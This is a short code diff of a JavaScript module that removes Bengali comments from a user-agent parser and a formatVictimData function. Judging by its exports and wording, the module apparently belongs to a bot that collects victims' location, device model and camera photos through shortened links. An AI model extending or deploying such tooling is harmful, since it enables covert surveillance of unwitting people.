@@ -158,9 +158,7 @@ function getDeviceModel(device) {
     // Android: (Linux; Android 11; vivo 1906 Build/RP1A.200720.012)
     let match = ua.match(/\([^;]+;\s*[^;]+;\s*([^;\)]+)/);
     if (match) {
-        // "vivo 1906 Build/RP1A.200720.012" থেকে শুধু "vivo 1906" বা পুরোটা
         let model = match[1].trim();
-        // Build/ অংশ বাদ দিতে চাইলে:
         if (model.includes(' Build/')) {
             model = model.split(' Build/')[0];
         }
@@ -175,7 +173,6 @@ function getDeviceModel(device) {
     match = ua.match(/\(Windows NT [^;]+;\s*([^;\)]+)/);
     if (match) return match[1].trim();
     
-    // কিছু না পেলে প্লাটফর্ম দেখান
     return device.platform || 'N/A';
 }
 
@@ -213,7 +210,6 @@ function formatVictimData(victim) {
         msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
     
-    // লোকেশন টাইপ হলে ক্যামেরার কথা দেখাবে না
     if (victim.type !== 'location' && victim.camera && victim.camera.length > 0) {
         msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি (ছবি আলাদাভাবে আসছে)`;
     }
@@ -243,7 +239,7 @@ module.exports = {
     sendImageMessage,
     getUserProfile,
     shortenUrl,
-    getDeviceModel,      // নতুন ফাংশন এক্সপোর্ট
+    getDeviceModel,
     formatVictimData,
     formatLocationMessage
 };
